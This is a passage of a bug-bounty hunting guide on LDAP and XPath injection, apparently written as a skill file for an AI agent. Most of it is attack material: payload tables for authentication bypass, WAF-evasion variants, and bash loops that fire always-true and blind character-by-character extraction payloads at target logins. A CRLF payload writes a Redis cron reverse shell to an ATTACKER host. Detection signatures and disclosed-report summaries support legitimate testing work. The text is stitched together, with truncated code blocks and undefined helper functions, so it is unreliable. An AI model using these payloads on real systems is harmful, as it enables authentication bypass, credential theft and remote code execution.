| `\` | `\5c` | escape character itself |
| NUL | `\00` | string terminator — truncates filter in C-backed servers |
| `/` | (DN context) | RDN separator — relevant to DN injection |

If a safe (escaping) app is deployed, sending these raw yields the identical baseline. Any difference = unescaped → injectable.

### Search-filter vs DN injection (different bugs — payloads do NOT transfer)
- **Search-filter injection** (the dominant shape in the pack, 9/15): input lands in `(attr=VALUE)`. Payloads use `* ( ) & | !`.
  ```
  (&(uid=<USER>)(userPassword=<PASS>))     target form
  *                                       wildcard
  *)(uid=*))(|(uid=*                       always-true OR
  admin)(!(userPassword=ZZZ))              AND NOT a never-set attr
  *)(cn=*)(cn=*                            filter-mutation DoS (#906959)
  admin)(uid=*))%00                        NUL truncate password clause
  ```
- **DN injection**: input is concatenated into a Distinguished Name (`uid=VALUE,ou=people,dc=corp`). Here `, = + " \ < > ; /` matter and `*` is NOT a wildcard. Probe with `admin,dc=corp` / `admin)(...` separately.

### Auth-bypass payload matrix (balance against the app's appended clause)

Assumed target filter: `(&(uid=USER)(userPassword=PASS))`. "Resulting filter" assumes the app
appends `)(userPassword=PASS))`.

| Payload (USER value) | Resulting logic | Notes |
|----------------------|-----------------|-------|
| `admin*` | `(&(uid=admin*)(userPassword=PASS))` | wildcard suffix; lowest noise, try first |
| `*)(uid=*))(\|(uid=*` | `(&(*)(uid=*))(\|(uid=*)(userPassword=PASS))` | classic self-balancing always-true |
| `admin)(!(&(uid=ZZZ)))` | `(&(uid=admin)(!(&(uid=ZZZ)))(...))` | NOT-of-impossible → true |
| `admin)(!(userPassword=ZZZ))` | `(&(uid=admin)(!(userPassword=ZZZ))(...))` | AND NOT a never-set attr |
| `admin)(uid=*))%00` | filter truncated at NUL | C-backed/JNDI stacks only |
| `*)(cn=*)(cn=*` | filter mutated into expansion | DoS/error shape from [#906959] |

DN-injection payloads (different grammar — `*` is literal here):
```
admin,dc=corp,dc=local           append/override RDN chain
admin,ou=admins,dc=corp          redirect the bind to a different container
admin\2c ou=admins               escaped-comma confusion
admin")(objectClass=*            quote + filter metacharacter breakout
```

### CRLF / protocol-smuggling payloads (admin LDAP settings field)

```bash
# ownCloud #1054282 — intercept the request and remove URL encoding before sending.
# SMTP arbitrary mail:
<LDAP_PASSWORD>%0D%0AMAIL FROM:<attacker@evil>%0D%0ARCPT TO:<victim@corp>%0D%0ADATA%0D%0A...
# Redis cron write → RCE (conceptual):
<LDAP_PASSWORD>%0D%0ASET cron1 "\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n"%0D%0ABGSAVE%0D%0A
```
Only attempt with admin credentials or a stolen admin session (the report required
"Privileges required: Admin"). Map the reachable internal services before assigning severity.

### AD vs generic LDAP — claim discipline
| | Generic LDAP (OpenLDAP, 389-DS, ApacheDS) | Active Directory |
|---|---|---|
| Password attribute | `userPassword` — may hold `{SSHA}`/`{MD5}`/`{CRYPT}` and **is readable** if ACL allows | `unicodePwd` — **write-only**, never returned by a search |
| Hash exfil via injection | Possible where ACLs leak `userPassword` | **Not possible** — no readable hash attribute |
| Useful enum attrs | `uid`, `cn`, `mail`, `userPassword` | `sAMAccountName`, `userPrincipalName`, `mail`, `memberOf`, `description`/`info` (often plaintext secrets) |

**Never claim "extracted AD password hashes"** — `unicodePwd` is write-only. Against AD, the credential win is `description`/`info` misuse or usernames feeding a spray. The hash-exfil technique applies only to non-AD directories exposing `userPassword`.

### Blind oracle choices (ranked by reliability)
1. **OOB / referral hit** — inject a referral/URL the server dereferences to Collaborator; unambiguous server-side proof.
2. **HTTP status oracle** — e.g. Webfinger 200 (exists) vs 404 (not) used for char-by-char extraction ([#1278891]).
3. **Paired size oracle** — TRUE-class vs FALSE-class response length with controls (Phase 3).
4. **Body-marker oracle** — presence/absence of `"Invalid credentials"` etc.
5. **Timing oracle** — heavy filter / port differentiation; last resort, most jitter.

### Offline hash cracking (non-AD only)
`{SSHA}` → hashcat `-m 111`; `{SSHA256}` = 1411; `{SSHA512}` = 1711; `{CRYPT}` mode depends on the `$id$` prefix (`$1$`=500, `$6$`=1800).

### Detection signatures (for defensive review / confirming exploitation in logs)

```
# Request-side indicators of LDAP injection attempts
\(\|(uid=|cn=|\*\)|\)\(|\)\(\! |%00|%2a%29|%28%7c|\x00
"(uid=" or "(mail=" with unbalanced parentheses
Webfinger resource= containing `*`, `)`, `(`, or `\`
LDAP password/config field containing %0D%0A / \r\n

# Server-side error indicators
javax.naming.directory.InvalidSearchFilterException
LDAP: error code 49 - 80090308
0x80005000 (ADSI)
"Bad search filter" / "Invalid syntax"
curl assert: try_read1msg / BER_BVISEMPTY  (#3258022)
```

For each indicator, verify whether the application **escaped** the character — a WAF block
page is not a fix; the filter construction must apply RFC 4515 escaping.

### Grep patterns for source review
```bash
grep -rE "ldapClient\.search|ldap_search\(|filter:\s*['\"].*\+|jndi|ldap://" --include="*.js" --include="*.py" --include="*.java" --include="*.php"
grep -rE "LDAP_ADMIN_PASSWORD|CLOUDRON_LDAP_URL|LDAP_BASE_DN|userPassword|unicodePwd" .
grep -rE "\.well-known/webfinger|webfinger" --include="*.conf" --include="*.xml" --include="*.js"
```

---

## Common Root Causes

1. **String-concatenated filters** — user input interpolated directly into `(|(uid=${username})...)` with no RFC 4515 escaping ([#906959], [#907311]). The feature is legitimate; the missing escaping is the bug.
2. **Unescaped registration/store writes** — self-registration attributes written to a directory without sanitization → fatal errors and injection ([#359290]).
3. **Unvalidated Webfinger principal** — discovery endpoints pass `resource=` into a directory lookup that becomes a char-by-char oracle (CVE-2021-29156, [#1278050]/[#1278891]).
4. **Misapplied user filters** — the configured LDAP filter isn't enforced at login time, letting excluded accounts authenticate ([#205908]).
5. **Admin field used as a raw network payload** — LDAP password/host fields fed to a socket without CRLF or scheme validation → protocol smuggling ([#1054282]).
6. **Automatic referral chasing** — LDAP clients that follow attacker-chosen referrals and re-bind, leaking current credentials to a second host ([#3756699]).
7. **Non-canonical LDIF serialization** — DN and attribute names written verbatim without RFC 2849 base64 encoding → line injection into LDIF consumers ([#4023506]).
8. **Unhardened BER parsing** — malformed LDAP responses reach an assert/parse path and crash the process ([#3258022]).
9. **Anonymous/NULL bind permitted** — directory ACLs allow unauthenticated reads of the whole DIT ([#1937235], [#2081332], [#1869184]).
10. **Credentials in logs / public repos** — secrets written to log files on server failure ([#264426]) or committed to GitHub ([#1004412]).

### Root-cause → confirmation map

| Root cause | One-step confirmation |
|------------|------------------------|
| String-concatenated filter | Source review shows `filter: ... + username`, or a lone `)` yields a filter error live |
| Unescaped registration write | `"` in a name field → `0x80005000` fatal error (#359290) |
| Unvalidated Webfinger principal | Prefix oracle changes 200→404 on character variation (#1278891) |
| Misapplied user filter | Login succeeds for an account excluded by the configured filter (#205908) |
| Raw admin field as network payload | `%0D%0A` in LDAP password produces an SMTP/Redis interaction (#1054282) |
| Automatic referral chasing | Second-hop BindRequest appears on your listener (#3756699) |
| Non-canonical LDIF serialization | Crafted DN/attr value injects a new `DN:`/`attr:` line (#4023506) |
| Unhardened BER parsing | Malformed LDAP reply on your socket crashes the process (#3258022) |
| Anonymous NULL bind | `ldapsearch -x` returns entries without credentials (#1937235) |
| Secrets in logs/repos | File/commit contains `LDAP_ADMIN_PASSWORD` or cleartext bind password (#1004412, #264426) |

Understanding the root cause matters for the report: the fix for a concatenated filter is
parameterized/escaped filter construction (OWASP WSTG-INPV-06, RFC 4515 §3), whereas the fix
for referral chasing is `LDAP_OPT_REFERRALS=OFF`, and for CRLF smuggling it is rejecting
newline characters in all LDAP settings fields.

---

## Bypass Techniques

### Filter-level bypasses (search-filter context)
- **Wildcard broadening** — `admin*` / `*` to match unintended entries.
- **Parenthesis balancing** — close the current group, inject OR/NOT logic, re-balance the trailing clause.
- **NOT-of-impossible** — `admin)(!(userPassword=ZZZ))` → always true without needing a wildcard.
- **NUL truncation** — `%00` to drop the trailing password clause in C-backed/JNDI stacks.
- **Double-quote / DN metacharacters** — `"` caused fatal errors in ADSI ([#359290]); in DN context use `, = + " \ < > ; /` (not `*`).
- **Attribute switching in multi-attribute filters** — the npm filters searched `uid|mail|username|sAMAccountName`; inject through whichever attribute the app interpolates.

### Filter-error / DoS amplification
- `*)(cn=*)(cn=*` — the verbatim DoS payload from [#906959]; expands/mutates the filter into an error state.
- Unbalanced `(` / `)` to force `InvalidSearchFilterException` — useful as a detection tell, not a bypass.

### Transport / encoding bypasses
- **URL-decode stripping for CRLF** — ownCloud URL-encodes the LDAP password; intercept the request with a proxy to remove encoding before injecting `\r\n` ([#1054282]).
- **JSON-body transport** — move the tainted field from query to JSON (`json-body` signal) to dodge parameter-name WAF rules ([#907311]).
- **Public-code pivot** — if the live host has no open port, leaked creds still count as lateral-movement risk ([#1004412]).

### Client / referral bypasses
- **Referral redirection** — attacker-controlled first-hop LDAP server returns a referral to an internal or attacker host; clients with referral chasing on will re-bind ([#3756699]).
- **LDIF line injection** — place CRLF + forged `DN:`/`attribute:` lines where the client writes DN/attribute names verbatim ([#4023506]).
- **Malformed BER reply** — a crafted binary response on an LDAP port asserts/crashes parsers like curl's `try_read1msg` ([#3258022]).

### XPath-specific
- Keep quotes/brackets balanced; XPath has **no comment syntax**, so `' or '1'='1` must leave the expression well-formed (e.g. `admin' or '1'='1' or 'a'='b`).
- Use union operators (`|`) for blind node dumps when boolean injection alone doesn't return data.

### Encoding & WAF-evasion bypasses

```
# RFC 4515 hex-escape variants (safe apps escape; injectable ones may double-decode)
*    -> \2a    (     -> \28    )     -> \29    \     -> \5c    NUL -> \00
# Try double-encoded forms where a front-end decodes once before the LDAP call:
%5C2a  %5C28  %5C29  %2529  %2500
```

- **Transport switching** — move the tainted field from a query parameter to a JSON body
  (`json-body` signal, [#907311]) or to a registration attribute ([#359290]) when the
  login form is filtered.
- **Split the payload across fields** — some apps concatenate multiple user inputs into one
  filter; inject `)(` in one field and the matching logic in another.
- **Case / whitespace variation** — LDAP attribute names are case-insensitive; try
  `sAMAccountName`, `SamAccountName` when an attribute-name filter blocks one form.
- **Wrapper paths** — when the app itself base64-encodes values before the directory call,
  the escaping step may be skipped for the decoded value; submit encoded metacharacters.
- **Denial-of-service as a fallback signal** — if strict escaping blocks all logic injection,
  filter-mutation payloads like `*)(cn=*)(cn=*` may still expand the query into a DoS
  (the actual impact of [#906959]/[#907311]).

### Bypass decision guide

- **Filter is escaped on login but not on registration/search?** Attack the unescaped surface.
- **Metacharacters blocked but wildcards allowed?** Try `admin*` / pure-wildcard enumeration.
- **No response oracle, no OOB?** Only anonymous bind / config shapes remain — pivot to recon.
- **LDAP client follows referrals?** Prefer referral/OOB over filter logic; it is decisive.

---

## Gate 0 Validation

Before writing the report, confirm all three. A "bypass" or "match" is only real once syntax-error, WAF-block, and length-jitter explanations are eliminated.

1. **What can the attacker DO right now?**
   - Auth-bypass: does the always-true payload return a **valid authenticated session** (session cookie + access to a post-login resource)?
   - Hash/token theft: can you demonstrate recovered characters that verify by a direct lookup or by a session that works?
   - Blind: is there a true/false control pair, or an OOB/referral hit, tied to a specific attribute?
   - "The filter errored" or "the response differed" alone is insufficient — show *what was read or accessed*.
2. **What does the victim lose?**
   - Admin/SSO session → Critical. Password hashes / session tokens / private keys → Critical (Webfinger class). Directory user/group metadata → Medium-High. Internal SMTP/Redis via CRLF → High-to-Critical (RCE potential). Filter DoS / BER crash → Low-Medium. Password-in-logs / creds-in-repo → credential exposure, scope-dependent.
   - Quantify the blast radius (how many users, which privileged groups, which internal services).
3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the endpoint/version still live (e.g. OpenAM < 13.5.1, vulnerable curl/npm version)?
   - Does each recovered char reproduce 3× with a stable oracle, and does the FALSE control stay FALSE?
   - Can a second person follow the steps without prior knowledge and get the same result?

Negative controls to include in the report:
- [ ] Equally-shaped but logically-FALSE payload → failure response (if both succeed, it's a broken endpoint, not LDAP injection).
- [ ] One-paren-removed payload → filter-syntax error (proves the filter parsed and executed).
- [ ] AD claim discipline — enumerated AD-specific attrs (`sAMAccountName`/`memberOf`); never claim AD hash exfil.
- [ ] OOB where possible — prefer a Collaborator referral hit over length-only inference.

### Evidence checklist to paste into the report

1. **Affected component & version** — e.g. ForgeRock OpenAM < 13.5.1, curl 8.21.0-DEV
   `lib/ldap.c`, cloudron-surfer npm module, ownCloud `user_ldap`.
2. **Exact request** — method, path, and the parameter carrying the payload (with the
   payload in clear, plus the URL-encoded form if encoding mattered).
3. **Baseline vs injected response** — status code, body length, and any body marker for
   both the control and the attack request.
4. **True/false control pair** — show that a logically-TRUE payload and a logically-FALSE
   payload produce *different* responses. This is what separates injection from a broken
   endpoint.
5. **Proof of impact** — a working session cookie, the recovered hash/token characters,
   the directory entries enumerated, the internal service interaction, or the crash.
6. **Reproduction steps** — numbered, reproducible in ~10 minutes by a third party.
7. **Root cause & remediation** — unescaped filter, missing referral disable, missing CRLF
   check, anonymous bind, etc., mapped to the fix.
8. **Scope** — how many users/entries/services are affected; which privileged groups were
   reachable.

### Do-not-submit list (retract or keep hunting)

- A lone filter-syntax error with no downstream impact — a lead, not a finding.
- A "bypass" that only changes the error page but yields no session or data.
- A blind length difference that does not survive the FALSE-control recheck.
- A claimed "AD hash dump" — impossible; `unicodePwd` is write-only.
- A credential leak with no statement of whether the creds are live/in scope (state it
  explicitly, as [#1004412] did).

---

## Real Impact Examples

### Scenario A — Webfinger char-by-char hash/session-token theft (ForgeRock OpenAM, CVE-2021-29156)
An unauthenticated attacker queried `/.well-known/webfinger?resource=<prefix>*` against ForgeRock OpenAM before 13.5.1. The Webfinger lookup passed the principal into an LDAP filter and leaked a boolean oracle: a prefix that matched an existing user returned `200 OK`, a non-matching prefix returned `404`. By iterating each character position over the alphabet and watching the status code, the attacker recovered an entire attribute value one character at a time — password hashes, a live session token, or a private key. This is the highest-impact shape in the pack ([#1278050], [#1278891]).

### Scenario B — Filter-injection DoS via public npm module (cloudron-surfer / meemo-app)
Researchers reviewing published Node.js source found `var filter = '(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))'` with `username` unescaped. Submitting `*)(cn=*)(cn=*` mutated the filter into an expensive/erroring query, causing a denial of service classified Critical in the npm advisories ([#906959], [#907311]). The lesson: LDAP injection often surfaces as filter-error DoS, not just auth bypass — hunt both.

### Scenario C — LDAP password CRLF → internal protocol smuggling (ownCloud)
With admin credentials (or a stolen admin session), the attacker edited the `user_ldap` plugin's LDAP password field. The field was set without the newline check applied to other LDAP settings. Intercepting the request to strip URL encoding, the attacker injected `\r\n` sequences that spoke raw SMTP and Redis on internal plaintext ports — sending arbitrary mail and writing a Redis cron that could lead to RCE ([#1054282]).

### Scenario D — Referral chasing leaks Windows logon credentials (curl)
A libcurl-based LDAP consumer (`lib/ldap.c`) failed to disable automatic referral chasing (unlike `lib/openldap.c`, which sets `LDAP_OPT_REFERRALS=OFF`). A malicious first-hop LDAP server returned a referral to an attacker-controlled second server; curl re-bound to it, leaking the current Windows logon credentials (WinLDAP builds) in the second-hop `BindRequest` ([#3756699]).

**Attack chain:** attacker hosts first-hop LDAP server → target's LDAP URL consumer connects →
server returns referral → client re-binds to attacker's second hop → `BindRequest` carries
the current logon credentials → attacker captures them and reuses them internally.

### Scenario E — Anonymous directory read & user-filter bypass (DoD/State Dept/Nextcloud)

Multiple government hosts exposed LDAP on `389` with anonymous NULL binds enabled. Running
`nmap -n -Pn --script "ldap* and not brute"` and `ldapsearch -x` returned the full directory:
usernames, emails, org structure, and group memberships ([#1937235], [#2081332], [#1869184]).
Separately, Nextcloud's login path accepted a valid directory account that did not match the
administrator-configured user filter — the account authenticated despite being excluded,
and was invisible on the admin Users page ([#205908]).

**Attack chain:** discover exposed port/subdomain → anonymous bind → enumerate users and
`memberOf` → identify Domain Admins → targeted phishing/spray; or, for the filter bypass,
log in with an out-of-scope account → access data that policy intended to withhold.

### Cross-scenario lessons

- The same root class — *untrusted input crossing into a directory query* — produced Critical
  token theft, Critical DoS, High protocol smuggling, Medium credential leaks, and Low
  crash/info-disclosure findings. Severity follows **what the access yields**, not the payload.
- Boolean oracles are the universal amplifier: 200/404 (Webfinger), result count, response
  length, and session success/failure are the same primitive at different fidelity.
  Infrastructure/client bugs (referral, LDIF, BER) matter as much as web-app filter bugs.

---

## Disclosed Report Citations (15 full reports read — all IDs real, from the study pack)

- **U.S. Dept Of Defense — LDAP Server NULL Bind Connection Information Disclosure** ([H1 #1937235](https://hackerone.com/reports/1937235)) — anonymous NULL-bind / info disclosure, nmap `ldap*` port scan, High, 2023.
- **Node.js third-party modules — [cloudron-surfer] Denial of Service via LDAP Injection** ([H1 #906959](https://hackerone.com/reports/906959)) — search-filter injection DoS, unescaped `username` in `ldapjs` filter (`*)(cn=*)(cn=*)`), public-code/js-source review, Critical, 2020.
- **Node.js third-party modules — [meemo-app] Denial of Service via LDAP Injection** ([H1 #907311](https://hackerone.com/reports/907311)) — search-filter injection DoS, concatenated `(|(uid=...)...)` filter, JS source review + JSON-body, Critical, 2020.
- **Acronis — Possible LDAP username and password disclosed on Github** ([H1 #1004412](https://hackerone.com/reports/1004412)) — credential exposure, `LDAP_ADMIN_USER`/`LDAP_ADMIN_PASSWORD` in public `.env.testing`, public-code search, Medium, 2020.
- **curl — curl ASSERTs when accessing an LDAP URL** ([H1 #3258022](https://hackerone.com/reports/3258022)) — BER-parser assertion crash (DoS), oss-fuzz `ldap://localhost:1388` malformed reply, fuzzing-enumeration, None/2025.
- **curl — libcurl LDAP LDIF: entry DN and attribute names written without RFC 2849 base64 encoding, allowing server line injection** ([H1 #4023506](https://hackerone.com/reports/4023506)) — CRLF/LDIF line injection, DN/attr names serialized verbatim, base64-encoding gap, Low, 2026.
- **ownCloud — Protocol Smuggling over LDAP password field** ([H1 #1054282](https://hackerone.com/reports/1054282)) — CRLF injection / protocol smuggling via unescaped `\r\n` in LDAP password → SMTP/Redis/internal plaintext services, admin required, Low, 2020.
- **U.S. Dept Of Defense — LDAP Injection at ██████** ([H1 #359290](https://hackerone.com/reports/359290)) — search-filter injection on registration form, double-quote first name → fatal error `0x80005000`, filter-bypass, Medium, 2018.
- **Nextcloud — LDAP login possible even though account doesn't match user filter** ([H1 #205908](https://hackerone.com/reports/205908)) — improper authentication / user-filter bypass, valid account outside filter can log in, None, 2017.
- **U.S. Dept Of Defense — [CVE-2021-29156] LDAP Injection at https://██████** ([H1 #1278891](https://hackerone.com/reports/1278891)) — ForgeRock OpenAM Webfinger LDAP injection, char-by-char hash/session-token/private-key retrieval via 200/404 oracle, Medium, 2021.
- **curl — lib/ldap.c follows attacker-controlled LDAP referrals and binds to a second server; WinLDAP builds leak current logon credentials** ([H1 #3756699](https://hackerone.com/reports/3756699)) — referral-chasing credential leak, `LDAP_OPT_REFERRALS` not disabled, proxy-feature/session-attack, Medium, 2026.
- **U.S. Dept Of Defense — [CVE-2021-29156 on ForgeRock OpenAm] LDAP Injection in Webfinger Protocol!** ([H1 #1278050](https://hackerone.com/reports/1278050)) — Webfinger LDAP injection, unauthenticated char-by-char password-hash/session-token/private-key exfiltration, Medium, 2021.
- **Nextcloud — Nextcloud logs ldap passwords** ([H1 #264426](https://hackerone.com/reports/264426)) — plaintext password logging on LDAP server unavailability, missing sensitive-parameter methods in `Log.php`, Low, 2017.
- **deptofdefense — LDAP Anonymous Login enabled in ████** ([H1 #2081332](https://hackerone.com/reports/2081332)) — anonymous LDAP bind / info disclosure, `ldap3` sort-request control enumeration, high, 2023.
- **us-department-of-state — LDAP anonymous access enabled at certrep.pki.state.gov:389** ([H1 #1869184](https://hackerone.com/reports/1869184)) — anonymous LDAP access on subdomain, nmap `ldap*` + ldapadmin tool, medium, 2023.

---

## Related Skills & Chains

- **`hunt-ssrf`** — LDAP referral chasing and `ldap://` URL fetchers are SSRF-class primitives; a Collaborator hit from a referral is the same OOB confirmation discipline. Chain: injected referral → internal LDAP/second-hop server → credential leak.
- **`hunt-sqli` / `hunt-nosql`** — filter/query-concatenation concepts transfer directly (boolean oracles, always-true payloads); XPath injection is the XML-store sibling of SQLi.
- **`hunt-auth` / `hunt-session`** — auth bypass and Webfinger session-token theft land here; a recovered session token feeds straight into session hijacking.
- **`security-arsenal`** — load the LDAP filter-escape table (`\2a \28 \29 \5c \00`) and the RFC 4515 special-character set before testing filters.
- **`triage-validation`** — apply the Gate 0 controls: a single error response is not a bypass; require a valid session, a true/false oracle pair, or an OOB hit before submission.
- **`recon-public-code`** — GitHub/GitLab search for `LDAP_ADMIN_PASSWORD`, `ldapClient.search`, `CLOUDRON_LDAP_URL` surfaced two Critical npm findings and one Acronis credential leak in this pack.
- **`hunt-cloud-misconfig`** — anonymous LDAP and leaked bind creds are directory-layer
  misconfigurations; chain to cloud IAM when the directory federates SSO into cloud roles.
- **`hunt-rce`** — CRLF protocol smuggling into Redis (`CONFIG SET dir` + cron/SSH key write)
  is the direct RCE path from [#1054282]; the BER crash (#3258022) is a DoS primitive.

### LDAP chain table

| LDAP primitive | Chain to | Impact |
|----------------|----------|--------|
| Always-true filter auth bypass | Admin/SSO panel as first directory entry | Critical |
| Webfinger boolean oracle | Char-by-char hash / session token / private key theft | Critical |
| AD `sAMAccountName` enumeration | Username list → password spray / credential stuffing | Mass-ATO risk |
| `memberOf` enumeration | Identify Domain Admins → targeted phishing/spray | Targeted compromise |
| `description`/`info` field read | Plaintext creds admins stashed there | Direct credential leak |
| Blind `userPassword` exfil (non-AD only) | `{SSHA}`/`{CRYPT}` → hashcat → offline crack | High |
| CRLF into LDAP password → SMTP/Redis | Arbitrary mail / Redis cron write → RCE | High–Critical |
| Automatic referral chasing | Server-side request / internal directory reach | SSRF-class, credential leak |
| Anonymous NULL bind | Full DIT read → org chart, emails, mis-stored secrets | Medium–High |

> **AD discipline reminder:** AD has no readable password attribute — never list "extract AD
> hashes" as a chain. Against AD, the credential win comes from `description`/`info` misuse
> or from enumerated usernames feeding a spray, never from `unicodePwd`.


---

## Merged Source Knowledge

This section consolidates **48 unique knowledge blocks** from 2 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (58 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-ldap/SKILL.md`

# HUNT-LDAP — LDAP Injection & XPath Injection

> Grounding note: LDAP injection is rarely disclosed with verbatim payloads on
> public platforms (most live on internal-pentest reports). This skill is
> grounded in the **OWASP LDAP Injection Prevention / Testing Guide
> (WSTG-INPV-06)**, **PortSwigger Web Security Academy (LDAP injection)**, and
> the **RFC 4515** filter grammar — all publicly verifiable references rather
> than invented HackerOne IDs. Do not cite a report you cannot link.

## Crown Jewel Targets

LDAP injection that bypasses authentication = **Critical**. Blind attribute
exfiltration of credentials/secrets = **High**. AD enumeration alone = Medium-High.

**Highest-value chains:**
- **LDAP auth bypass** — close the `uid` filter and append an always-true OR so the
  bind/search returns the admin entry without a valid password.
- **Blind attribute exfil** — char-by-char extraction of an attribute value via a
  boolean oracle (login success/failure, result count, or response length).
- **userPassword hash exfil (non-AD only)** — on OpenLDAP/389-DS the
  `userPassword` attribute can hold `{SSHA}`/`{CRYPT}` hashes that ARE readable
  by query. See the AD-vs-generic warning below.
- **XPath injection auth bypass** — `' or '1'='1` against XML-backed auth.

---

## CRITICAL — Active Directory vs generic LDAP

Do **not** conflate the two. They behave very differently:

| | Generic LDAP (OpenLDAP, 389-DS, ApacheDS) | Active Directory |
|---|---|---|
| Password attribute | `userPassword` — may hold `{SSHA}`/`{MD5}`/`{CRYPT}` and **is readable** if ACL allows | `unicodePwd` — **write-only**, never returned by any search |
| Hash exfil via injection | **Possible** where ACLs leak `userPassword` | **Not possible** — there is no readable hash attribute over LDAP |
| Useful enum attrs | `uid`, `cn`, `mail`, `userPassword` | `sAMAccountName`, `userPrincipalName`, `mail`, `memberOf`, `description` (often holds plaintext secrets!) |

**Do not tell a reader that blind LDAP injection yields AD password hashes — it
does not.** `unicodePwd` is write-only. Against AD, the win is enumeration
(`sAMAccountName`, `memberOf`, `description`/`info` fields that admins misuse to
store passwords) and auth bypass — not hash dumping. The hash-exfil technique
applies **only** to non-AD directories exposing `userPassword`.

---

## Attack Surface Signals

```
Corporate SSO / intranet login pages (often legacy Java/Spring/PHP)
Windows + IIS + "integrated" directory auth
/api/ldap/*  /api/directory/*  /people  /address-book  /search?dir=
"Find a colleague" / org-chart / employee-search features
XML-backed config or auth → XPath injection candidate
Error strings that confirm an LDAP backend:
  javax.naming.NameNotFoundException
  javax.naming.directory.InvalidSearchFilterException
  LDAP: error code 49 - 80090308  (AD invalid creds / bind failure)
  com.sun.jndi.ldap.*  /  System.DirectoryServices  /  ldap_search():
  "Bad search filter"  /  net.ldap (Go)  /  python-ldap SERVER_DOWN
```

---

## LDAP filter grammar (RFC 4515) — why injection works

A login filter is typically built by string-concat:

```
(&(uid=<USERNAME>)(userPassword=<PASSWORD>))
```

`&` = AND, `|` = OR, `!` = NOT. **Filters are prefix/Polish notation** — the
operator comes first and every sub-filter is parenthesised. To inject you must
(a) escape the current `(uid=...)` group, (b) inject your own logic, and
(c) leave the overall parenthesis count **balanced** or the server throws a
filter-syntax error instead of executing.

### The special-character set — TEST EACH ONE

These characters are syntactically meaningful and MUST be escaped by a safe app
(RFC 4515 §3). If the app reflects an error or behaves differently when you send
them raw, the input is unescaped → injectable:

| Char | Filter escape | Why it matters |
|------|---------------|----------------|
| `*`  | `\2a` | wildcard — matches any value |
| `(`  | `\28` | opens a filter group |
| `)`  | `\29` | closes a filter group |
| `\`  | `\5c` | escape char itself |
| NUL  | `\00` | string terminator — truncates filter in C-backed servers |
| `/`  | (DN context) | RDN separator — relevant for DN injection |

**Search-filter context vs DN injection** are different bugs:
- **Search-filter injection** (most common): your input lands inside a
  `(attr=VALUE)` filter. Payloads use `* ( ) & | !`.
- **DN injection**: your input is concatenated into a Distinguished Name
  (`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `"` `\` `<` `>` `;` and `/`
  matter, and a `*` is NOT a wildcard. Test both — the payloads do not transfer.

---

# An INJECTABLE app → 500 / filter-syntax error / different size.
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test)","password":"x"}' | grep -iE \
  "naming|InvalidSearchFilter|error code 49|Bad search filter|jndi|ldap_search"
```

A lone `)` that produces a syntax error/500 while a balanced payload does not is
the cleanest LDAP-injection tell — note it, you will need it as proof.

#   username = admin)(uid=*))%00      password = x

USERNAME_PAYLOADS=(
  'admin))(|(uid=*'        # close uid + close &, open OR uid=* — balance check below
  '*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic
  'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set → always true
  'admin*'                 # simple wildcard suffix — try first, lowest noise
)

for P in "${USERNAME_PAYLOADS[@]}"; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$P"),\"password\":\"anything\"}")
  echo "PAYLOAD: $P"
  echo "RESP:    ${R: -40}"
  echo "BASE:    $BASE   <-- compare http_code+size to rule out false positive"
  echo "---"
done
```

**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*
full filter, not just your payload. If the app appends `)(userPassword=...))`
after your input, leave the right number of trailing `)` so the final string is
balanced. An unbalanced filter = syntax error = NOT a bypass (false positive).

### Phase 3 — Blind exfil with a CONTROLLED oracle (not raw byte-count)

Raw `size_download` diffing is noise-prone (WAF banners, CSRF tokens, timestamps,
length-jitter on the injected char itself). Use a **paired true/false control**
so the oracle is the *response*, not the absolute size.

```bash

# Filter: (&(uid=admin)(userPassword=<PREFIX><CHAR>*))  on a NON-AD directory.
PREFIX=""
for pos in $(seq 1 32); do
  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
    S=$(probe "admin)(userPassword=${PREFIX}${C}*))(|(uid=*")
    if [ "$S" = "$T" ]; then PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break; fi
  done
done
echo "RECOVERED: $PREFIX"
```

False-positive guards for blind exfil:
- **Repeat each positive char 3x** and confirm the size is stable — length-jitter
  from the attacker-controlled char itself is the #1 false positive.
- Confirm the **FALSE control still returns the FALSE size** after each round (the
  app didn't just start erroring on every request — WAF block looks like a match).
- If body length is unreliable, switch the oracle to **HTTP status**, a **body
  marker string** (`"Invalid credentials"` present/absent), or **timing** with a
  heavy filter — but only after establishing a stable baseline delta.

# Bypass closes the name predicate and OR-trues the whole expression.
XPATH_PAYLOADS=(
  "' or '1'='1"
  "' or ''='"
  "admin' or '1'='1' or 'a'='b"     # keeps quoting balanced
  "x'] | //user/* | //user[name()='x"  # blind: dump all user nodes (XPath has no comments)
  "*[contains(name(),'pass')]"          # node-name discovery
)
for P in "${XPATH_PAYLOADS[@]}"; do
  E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$P")
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    --data-urlencode "username=$P" --data-urlencode "password=x")
  echo "$P  ->  ${R: -24}"
done

## Validation — rule out the false positive BEFORE you report

A "bypass" or "match" is only real once you have eliminated syntax-error,
WAF-block, and length-jitter explanations.

- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated
      session** (session cookie + access to a post-login resource), and the same
      request with one paren removed returns a **filter-syntax error** — proving
      the filter parsed and executed, not that the app fell open on every input.
- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload
      (`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both
      true-class and false-class "succeed", you found a broken endpoint, not LDAP
      injection.
